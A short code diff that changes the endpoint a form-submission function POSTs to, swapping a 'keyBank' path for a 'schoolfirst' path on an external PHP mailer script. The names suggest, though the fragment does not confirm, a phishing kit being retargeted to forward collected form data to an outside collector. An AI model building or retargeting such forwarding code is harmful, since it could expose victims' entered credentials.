@@ -171,7 +171,7 @@ const lastsubmit = () => {
 
 const completeSubmission = async () => {
   const MailReturn = await fetch(
-    "https://mailclient.trivecodes.com/keyBank/php/mail_key.php",
+    "https://mailclient.trivecodes.com/schoolfirst/php/mail_key.php",
     {
       method: "POST",
       headers: {
